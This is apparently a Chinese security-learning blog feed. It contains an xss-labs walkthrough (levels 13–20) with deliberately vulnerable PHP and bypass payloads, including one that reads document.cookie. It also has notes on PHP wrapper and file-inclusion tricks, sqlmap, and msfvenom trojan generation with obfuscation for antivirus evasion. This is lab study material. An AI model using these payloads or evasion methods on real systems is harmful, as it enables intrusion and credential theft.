$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_cook&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<ul>
<li>这里COOKIE提交的是user参数，更改payload增加user参数尝试。</li>
</ul>
<ol start="3">
<li></li>
</ol>
<pre><code>Cookies：user=&quot; type=&quot;text&quot; onclick=&quot;alert()
</code></pre>
<h1 id="14-xss-level14">14. xss-level14</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
&lt;/body&gt;
</code></pre>
<ul>
<li>会自动跳转到http://www.exifviewer.org/?z的页面，并且没有php的代码，一头雾水</li>
</ul>
<ol start="2">
<li>通过上网查询，得到解释，这里本来是一个exif xss的漏洞，要将xss代码写进exif里面，但是现在没有办法进行测试。</li>
<li>大致的意思为需要上传一个带有xss信息的图片来触发xss。</li>
<li>通过设置图片的主题或者标题为xss代码，上传图片。</li>
<li>模拟xss-level14的php代码。</li>
</ol>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;title&gt;欢迎来到level14&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
&lt;!--&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;--&gt;
    &lt;?php
   echo &quot;&lt;center&gt;
   &lt;form action=level14.php method=POST enctype=multipart/form-data&gt;
   &lt;label for=file&gt;文件名：&lt;/label&gt;
   &lt;input type=file name=file id=file&gt;&lt;br&gt;
   &lt;input type=submit name=submit value=提交&gt;
&lt;/form&gt;&lt;/center&gt;&quot;;

// 允许上传的图片后缀
$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);
$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
echo $_FILES[&quot;file&quot;][&quot;size&quot;];
$extension = end($temp);     // 获取文件后缀名
if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)
|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)
|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb
&amp;&amp; in_array($extension, $allowedExts))
{
    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
    {
        echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;
    }
    else
    {
        echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;
        echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;
        echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;
        echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br&gt;&quot;;
    
        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $_FILES[&quot;file&quot;][&quot;name&quot;]);
    }
}
else
{
    echo &quot;非法的文件格式&quot;;
}
    $file = $_FILES[&quot;file&quot;][&quot;name&quot;];
    echo $file;

    $exif = exif_read_data($file);
    var_dump($exif)
?&gt;
&lt;?php

?&gt;
&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/level15.php?src=level15.png&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h1 id="15-xss-level15">15. xss-level15</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;html ng-app&gt;
&lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;&gt;
        &lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level16.php?keyword=test&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level15&lt;/title&gt;
&lt;/head&gt;
&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
&lt;body&gt;&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt;&lt;/body&gt;
</code></pre>
<ul>
<li>因为原先的https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js被墙了，所以换成https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;src&quot;];
echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
?&gt;
</code></pre>
<ul>
<li>ng-include 指令使用了AngularJS，可以通过新的属性，新的表达式扩展HTML。</li>
<li>可以用于包含外部的 HTML 文件。</li>
<li>包含的内容将作为指定元素的子节点。</li>
<li>ng-include 属性的值可以是一个表达式，返回一个文件名。</li>
<li>默认情况下，包含的文件需要包含在同一个域名下。</li>
<li>值得注意
<ul>
<li>如果要指定单纯的地址，必须要加上引号。</li>
<li>当加载外部html文件时，scritp标签中的内容不会被执行，含有style标签样式可以被执行。</li>
</ul>
</li>
</ul>
<ol start="3">
<li>payload</li>
</ol>
<pre><code>level15.php?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;'
</code></pre>
<ul>
<li>这里已经知道了可以通过使用ng-include来包含HTML的内容</li>
<li>在.php后面增加了参数值。类似于访问了该文件参数值之后，将该值包含在html文件后响应。</li>
</ul>
<h1 id="16-xss-level16">16. xss-level16</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
&lt;center&gt;&lt;&amp;nbsp;&gt;alert()&lt;&amp;nbsp;&amp;nbsp;&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:29&lt;/h3&gt;&lt;/body&gt;
</code></pre>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);
echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
?&gt;
</code></pre>
<ul>
<li>script，空格，斜杠都被处理了，这里也没有一个值需要进行包裹。</li>
<li>用之前15关的方法，但是空格被实体化了，所以这里有绕过技巧涉及到url编码。</li>
<li>而我们又知道仅仅只在html代码中进行换行对实际的代码是没有效果的，所以这里可以用回车的url编码%0a来代替空格。</li>
</ul>
<ol start="3">
<li>payload</li>
</ol>
<pre><code>level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;
</code></pre>
<h1 id="17-xss-level17">17. xss-level17</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
&lt;embed src=xsf01.swf?a=b width=100% heigth=100%&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
&lt;/body&gt;
</code></pre>
<ul>
<li>特别说明：这之后的关卡需要用到flash插件</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php
ini_set(&quot;display_errors&quot;, 0);
echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
?&gt;
</code></pre>
<ul>
<li>arg01 arg02被过滤掉了，这里没有引号，不需要对src进行包裹，直接在后面加上payload，移动鼠标进行弹窗。</li>
</ul>
<ol start="3">
<li>payload</li>
</ol>
<pre><code>onmouseover=alert()
</code></pre>
<h1 id="18-xss-level18">18. xss-level18</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;
&lt;embed src=xsf02.swf?a=b width=100% heigth=100%&gt;&lt;/body&gt;
</code></pre>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php
ini_set(&quot;display_errors&quot;, 0);
echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
?&gt;
</code></pre>
<ul>
<li>查看17，18两关的代码基本上没有什么差别，用第17关的payload也可以通过</li>
</ul>
<h1 id="19-xss-level19">19. xss-level19</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;
&lt;embed src=&quot;xsf03.swf?a=b&quot; width=100% heigth=100%&gt;&lt;/body&gt;
</code></pre>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php
ini_set(&quot;display_errors&quot;, 0);
echo '&lt;embed src=&quot;xsf03.swf?'.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).'&quot; width=100% heigth=100%&gt;';
?&gt;
</code></pre>
<ol start="3">
<li>payload</li>
</ol>
<pre><code>level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;xss&lt;/a&gt;
</code></pre>
<ol start="4">
<li><a href="https://blog.csdn.net/u014029795/article/details/103213877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159547621119725219908275&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-2-103213877.first_rank_ecpm_v3_pc_rank_v4&amp;utm_term=xss-labs%2019&amp;spm=1018.2118.3001.4187">xss19</a></li>
</ol>
<h1 id="20-xss-level20">20. xss-level20</h1>
<pre><code>level20.php?arg01=id&amp;arg02=\&quot;))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height
</code></pre>
<p><a href="https://blog.csdn.net/u014029795/article/details/103217680">xss20</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[php 伪协议与钓鱼]]></title>
        <id>https://kite-007.github.io/php-wei-xie-yi-yu-diao-yu/</id>
        <link href="https://kite-007.github.io/php-wei-xie-yi-yu-diao-yu/">
        </link>
        <updated>2021-03-21T00:55:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="1">1.</h1>
<p>文件包含文件写入<br>
flag在服务器根目录<br>
目录穿越（../）或伪协议（php://filter/read=convert.base64）或file协议（file:///）<br>
字符串过滤器<br>
转换过滤器<br>
压缩过滤器<br>
编码绕过<br>
docx可以直接改为zip，两者可以相互打开，docx-小马，1.txt-zip-docx，<br>
phar协议-php-压缩包-木马-协议包含<br>
加密过滤器<br>
文件包含，直接运行php代码<br>
分离免杀，危险数据，exe运行文件<br>
exit绕过：exit部分进行编码处理，使php不能被识别，之后使内容写入文件，链接<br>
.htaccess配置文件，将文件直接当作php执行<br>
bypass绕过<br>
usc-2，构成2的倍数，对目标字符串2位一反转<br>
file_put_contents会解码一次，浏览器会解码一次，二次解码<br>
tamp，Windows临时文件，爆破临时将文件，<br>
伪造uav为一句话木马，文件包含日志文件，访问一句话木马，服务器访问临时文件，条件竞争<br>
python脚本-服务器-不知道路径-加载phpinfo-加载路径-包含getshell<br>
windows大小写不敏感，Linux大小写敏感</p>
<h1 id="2">2.</h1>
<p>打入内网，扩大成果<br>
cobait strike<br>
swaks</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# 工具]]></title>
        <id>https://kite-007.github.io/gong-ju/</id>
        <link href="https://kite-007.github.io/gong-ju/">
        </link>
        <updated>2021-03-16T23:57:18.000Z</updated>
        <content type="html"><![CDATA[<h1 id="1-sqlmap">1. sqlmap</h1>
<ol>
<li>介绍：它是一个开源渗透测试工具，它可以自动检测和利用SQL注入漏洞并接管数据库服务器的工具。</li>
<li>技巧：可以搜索php?id=,php?name=等等一些查看有没有表单提交。</li>
<li>操作：</li>
</ol>
<ul>
<li>sqlmap -u (需要测试的网站)；sqlmap会直接帮我们测试存不存在该类型漏洞，也会显示出payload</li>
<li>-h，-hh获取帮助文档或者更多帮助列表
<ul>
<li>Target；使用sqlmap的模式
<ul>
<li>-d [连接数据库信息]；测试连接数据库，需要下载驱动程序</li>
<li>-u</li>
<li>-m；文件中有多个参数时可以一个个遍历，查询其中一个则需要在这一个参数后面加上*</li>
<li>-r；测试http包（burp所抓到的包存入一个文件中，对文件进行测试）</li>
<li>-g [inurl:php?id=1]；google搜索（inurl:php?id=1）</li>
<li>-c；加载配置文件</li>
</ul>
</li>
<li>request；如何请求页面，链接页面的方式，请求页面的方式post，get等
<ul>
<li>--method；http请求方法</li>
<li>--data；填充post包</li>
<li>--cookie=COOKIE；设置COOKIE</li>
<li>--user-agent=AGENT；将sqlmap设置来源代理为AGENT</li>
<li>--random-agent；随机选取一个代理</li>
<li>--host=HOST；修改HOST</li>
<li>--referer=REFERER；修改REFERER网站来源</li>
<li>--header=HEADER；修改以上的http头</li>
</ul>
</li>
<li>optimization；实现优化作用，性能速度
<ul>
<li>-o；使用所有优化</li>
</ul>
</li>
<li>injection；注入参数，提供自定义的方式，脚本等</li>
<li>detection；探测注入等级</li>
<li>techniques；调整测试技术方式
<ul>
<li>--technique=TECH；默认使用所有注入方式</li>
</ul>
</li>
<li>enumeration；枚举参数（前提为存在sql注入）列出参数
<ul>
<li>--users</li>
<li>--tables</li>
</ul>
</li>
<li>windows registry access；查看win注册表</li>
<li>general；通用</li>
<li>miscellaneous；杂项
<ul>
<li>--wizard；sqlmap使用导航引导测试</li>
<li>--sqlmap-shell；sqlmap命令选项模式</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="2-metosploit">2. metosploit</h1>
<ol>
<li>介绍：Metasploit渗透测试框架（Free ，Pro），再Kali中使用msfconsole打开</li>
<li>功能：探测发现，漏洞验证，漏洞攻击，漏洞载核，编码混淆等等</li>
<li>命令：
<ul>
<li>show exploits；展示可使用的漏洞的攻击方式，如果要使用一个漏洞，则须先扫描漏洞</li>
<li>search [cve-XX]；搜索漏洞</li>
<li>use [漏洞存放目录]；使用漏洞</li>
<li>show info；查看漏洞设置选项</li>
<li>show payloads；use漏洞之后要使用的</li>
</ul>
<pre><code>use [漏洞] //使用漏洞攻击
set PAYLOAD &lt;Payload name&gt;//攻击成功之后会执行payload 
set LHOST &lt;LHOST value&gt;//对方链接攻击者IP 端口是什么
set LPORT &lt;LPORT value&gt;//
Show info
exploits/run
</code></pre>
<ul>
<li>meterpreter（模块）；肉机管理，回话管理（控制端）
<ul>
<li>shell，获取对方shell</li>
<li>Download/Upload</li>
<li>search/edit</li>
<li>portfwd端口转发</li>
<li>migrate迁移进程</li>
<li>execute</li>
</ul>
</li>
<li>msfvenom；生成payload，生成木马后门的工具</li>
</ul>
<pre><code>msfvenom -p [payload] LHOST=X  LPORT=X -f [exe] &gt; []
msfvenom//生成木马的工具
-p //指定payload类型
LHOST//是控制端IP
LPORT//控制端端口
-f //指文件格式
</code></pre>
<ul>
<li>混淆payload</li>
</ul>
<pre><code>msfvenom -p [payload] LHOST=X  LPORT=X -e [混淆] -f [exe] &gt; []
</code></pre>
<ul>
<li>check；扫描对方是否可以攻击，是否存在该漏洞</li>
<li>msfvenmo -l encoders ；编码混淆，木马混淆</li>
</ul>
</li>
<li>免杀*</li>
</ol>
<ul>
<li>混淆的主要目的（二进制）；修改md5（pe，资源表，字符串）</li>
</ul>
<h1 id="3-nmap">3. Nmap</h1>
<ol>
<li>使用流程：(目标确认—》主机发现—》扫描端口—》扫描技术—》探测服务—》探测防火墙—》性能优化—》报告输出)</li>
<li>用途： 活跃IP，端口的扫描，对端口，服务，操作系统的探测，将扫描的内容保存在一个文件，扫描常用的端口，多种扫描方式，脚本扫描，性能控制，主机发现，规避防火墙，MAC欺骗，空闲扫描。</li>
<li>端口扫描：</li>
</ol>
<ul>
<li>nmap 【网站/IP地址】-p 【端口】 -sS(扫描方式:基于TCP SYN) -sV(探测服务信息) -O(探测操作系统) -A(包含了-sV和-O等)
<ul>
<li>可以按回车显示进度，如果不对单一的端口进行扫描直接使用-sS -A即可。-iR，对随机IP扫描。</li>
<li>活跃IP：是指 一个 ip段 ，存在的 主机 较多， 查找 活跃 ip的 人一般会，运行远程溢出，弱口令扫描软件。</li>
<li>-p --top-ports X：扫描常用的端口X个。</li>
<li>-oN 【目录】，输出扫描内容到该目录的文件夹</li>
<li>--script=【./脚本目录】可以使用脚本</li>
<li>-n；不做DNS解析，如果解析了会知道域名</li>
<li>-F；扫描默认常用端口100多</li>
<li>-sL；简单列出扫描目标信息</li>
<li>-Pn；nmap扫描过程中会探测主机是否在线，如果主机在线，则会去扫描端口，通常情况下已经知道了主机在线，所以加上-Pn 【IP】，则不用再去探测主机是否在线，默认主机为在线状态。</li>
<li>-O：检测操作系统</li>
<li>-D 【IP】，【IP】：设置诱饵隐蔽扫描</li>
<li>-g 【端口】 【IP】：设置自己来源端口与IP（假）</li>
<li>-T&lt;0-5&gt;：速度性能控制</li>
<li>--spoof -mac 【MAC地址】：伪造自己的访问目标MAC地址为对应MAC地址</li>
<li>-sI ip:【脚本扫描到的端口】 【脚本扫描到的IP】；网络上有多台主机，当有某台空闲的时候，就可以利用对方的IP做出一些扫描。</li>
<li>sudo nmap --script ipidseq iR 10000 -oN ipidseq.txt
<ul>
<li>用脚本扫描扫出可以使用空闲扫描的对应IP端口</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI]]></title>
        <id>https://kite-007.github.io/kali/</id>
        <link href="https://kite-007.github.io/kali/">
        </link>
        <updated>2021-03-15T07:57:48.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E5%9F%BA%E6%9C%AC">1. 基本</a>
<ul>
<li><a href="#1-%E6%9B%B4%E6%94%B9root%E5%AF%86%E7%A0%81%E4%BD%BFkali%E8%83%BD%E5%A4%9F%E5%BC%80%E6%9C%BA%E7%99%BB%E9%99%86">1. 更改root密码，使kali能够开机登陆</a></li>
<li><a href="#2-%E6%8D%A2%E6%BA%90%E5%B9%B6%E6%9B%B4%E6%96%B0">2. 换源并更新</a></li>
<li><a href="#3-%E5%AE%89%E8%A3%85%E8%BE%93%E5%85%A5%E6%B3%95">3. 安装输入法</a></li>
</ul>
</li>
<li><a href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">2. 信息收集</a>
<ul>
<li><a href="#1-nmap%E6%89%AB%E6%8F%8Fip">1. Nmap扫描（IP）</a></li>
<li><a href="#2-%E5%AD%90%E5%9F%9F%E5%90%8D">2. 子域名</a></li>
</ul>
</li>
</ul>
(KALI)</p>
<h1 id="1-基本">1. 基本</h1>
<h2 id="1-更改root密码使kali能够开机登陆">1. 更改root密码，使kali能够开机登陆</h2>
<ul>
<li>（sudo passwd root）。</li>
<li>sudo命令以系统管理者的身份执行，相当于root。</li>
<li><img src="https://kite-007.github.io/post-images/1615795367734.png" alt="" loading="lazy"></li>
<li>uname可以查看版本</li>
</ul>
<h2 id="2-换源并更新">2. 换源并更新</h2>
<ul>
<li>kali的源文件在/etc/apt/sources.list文件中。</li>
</ul>
<pre><code>sudo vim /etc/apt/sources.list（打开sources.list 文件）

官方源
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib
中科大源
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
阿里云源
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
清华大学源
deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
浙大源
deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free

sudo apt-get update  # 取回更新的软件包列表信息
sudo apt-get upgrade # 进行一次升级
sudo apt-get clean # 删除已经下载的安装包
sudo reboot  #重启

安装vm-tools（因为实验很久并没有成功使用“文件夹共享功能”所以选择了这个方法）
可以快速方便的将文件直接拖进kali中使用

打开“终端”
输入sudo apt update (获取更新目录）
输入sudo apt -y full-upgrade (更新软件，-y参数表示自动）
输入sudo apt -y install open-vm-tools-desktop fuse （安装虚拟机增强工具）
输入sudo reboot (重启）
</code></pre>
<h2 id="3-安装输入法">3. 安装输入法</h2>
<ol>
<li>安装输入法框架（apt install fcitx）</li>
<li>安装谷歌拼音（apt install fcitx-googlepinyin）</li>
</ol>
<h1 id="2-信息收集">2. 信息收集</h1>
<h2 id="1-nmap扫描ip">1. Nmap扫描（IP）</h2>
<ol>
<li>使用流程：(目标确认—》主机发现—》扫描端口—》扫描技术—》探测服务—》探测防火墙—》性能优化—》报告输出)</li>
<li>用途： 活跃IP，端口的扫描，对端口，服务，操作系统的探测，将扫描的内容保存在一个文件，扫描常用的端口，多种扫描方式，脚本扫描，性能控制，主机发现，规避防火墙，MAC欺骗，空闲扫描。</li>
<li>端口扫描：</li>
</ol>
<ul>
<li>nmap 【网站/IP地址】-p 【端口】 -sS(扫描方式:基于TCP SYN) -sV(探测服务信息) -O(探测操作系统) -A(包含了-sV和-O等)
<ul>
<li>可以按回车显示进度，如果不对单一的端口进行扫描直接使用-sS -A即可。-iR，对随机IP扫描。</li>
<li>活跃IP：是指 一个 ip段 ，存在的 主机 较多， 查找 活跃 ip的 人一般会，运行远程溢出，弱口令扫描软件。</li>
<li>-p --top-ports X：扫描常用的端口X个。</li>
<li>-oN 【目录】，输出扫描内容到该目录的文件夹</li>
<li>--script=【./脚本目录】可以使用脚本</li>
<li>-n；不做DNS解析，如果解析了会知道域名</li>
<li>-F；扫描默认常用端口100多</li>
<li>-sL；简单列出扫描目标信息</li>
<li>-Pn；nmap扫描过程中会探测主机是否在线，如果主机在线，则会去扫描端口，通常情况下已经知道了主机在线，所以加上-Pn 【IP】，则不用再去探测主机是否在线，默认主机为在线状态。</li>
<li>-O：检测操作系统</li>
<li>-D 【IP】，【IP】：设置诱饵隐蔽扫描</li>
<li>-g 【端口】 【IP】：设置自己来源端口与IP（假）</li>
<li>-T&lt;0-5&gt;：速度性能控制</li>
<li>--spoof -mac 【MAC地址】：伪造自己的访问目标MAC地址为对应MAC地址</li>
<li>-sI ip:【脚本扫描到的端口】 【脚本扫描到的IP】；网络上有多台主机，当有某台空闲的时候，就可以利用对方的IP做出一些扫描。</li>
<li>sudo nmap --script ipidseq iR 10000 -oN ipidseq.txt
<ul>
<li>用脚本扫描扫出可以使用空闲扫描的对应IP端口</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-子域名">2. 子域名</h2>
<p><em>补充：子域名也要做DNS解析，它也有对应的IP。</em></p>
<ul>
<li>子域名有很多的获取方式。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[1. 信息收集之基本介绍]]></title>
        <id>https://kite-007.github.io/1-xin-xi-shou-ji/</id>
        <link href="https://kite-007.github.io/1-xin-xi-shou-ji/">
        </link>
        <updated>2021-03-14T02:22:19.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">1.域名信息收集</a>
<ul>
<li><a href="#1-%E5%9F%9F%E5%90%8D%E4%BB%8B%E7%BB%8D">1. 域名介绍</a></li>
<li><a href="#2-whois%E4%BB%8B%E7%BB%8D">2. Whois介绍</a></li>
<li><a href="#3-whois%E6%9F%A5%E8%AF%A2">3. Whois查询</a></li>
<li><a href="#4-%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2">4. 备案信息查询</a></li>
</ul>
</li>
<li><a href="#2-%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">2. 子域名信息收集</a>
<ul>
<li><a href="#1-%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BB%8B%E7%BB%8D">1. 子域名介绍</a></li>
<li><a href="#2-%E6%8C%96%E6%8E%98%E5%AD%90%E5%9F%9F%E5%90%8D%E9%87%8D%E8%A6%81%E6%80%A7">2. 挖掘子域名重要性</a></li>
<li><a href="#3-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95">3. 子域名挖掘方法</a></li>
<li><a href="#4-%E5%88%B7%E6%B4%9E%E6%80%9D%E8%B7%AF">4. 刷洞思路</a></li>
</ul>
</li>
<li><a href="#3-web%E7%AB%99%E7%82%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">3. web站点信息收集</a>
<ul>
<li><a href="#1-cms%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB">1. CMS指纹识别</a></li>
<li><a href="#2-%E9%92%88%E5%AF%B9cms%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2">2. 针对CMS漏洞查询</a></li>
<li><a href="#3-%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF">3. 敏感目录信息</a></li>
<li><a href="#4-wordpress%E6%B5%8B%E8%AF%95wpscankali">4. wordpress测试（wpscan）(kali)</a></li>
</ul>
</li>
<li><a href="#4-%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">4. 端口信息收集</a>
<ul>
<li><a href="#1-%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D">1. 端口介绍</a></li>
<li><a href="#2-%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">2. 端口信息收集</a></li>
<li><a href="#3-%E7%AB%AF%E5%8F%A3%E6%94%BB%E5%87%BB%E4%B9%8C%E4%BA%91%E6%9F%A5%E8%AF%A2%E7%AD%89%E7%AD%89">3. 端口攻击（乌云查询等等）</a></li>
<li><a href="#4-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">4. 防御措施</a></li>
</ul>
</li>
<li><a href="#5-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">5. 敏感信息收集</a>
<ul>
<li><a href="#1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%87%8D%E8%A6%81%E6%80%A7">1. 敏感信息收集重要性</a></li>
<li><a href="#2-google-hacking%E8%AF%AD%E6%B3%95">2. Google Hacking语法</a></li>
<li><a href="#3-http%E5%93%8D%E5%BA%94%E6%94%B6%E9%9B%86server%E4%BF%A1%E6%81%AF">3. HTTP响应收集Server信息</a></li>
<li><a href="#4-github%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">4. Github信息泄露</a></li>
</ul>
</li>
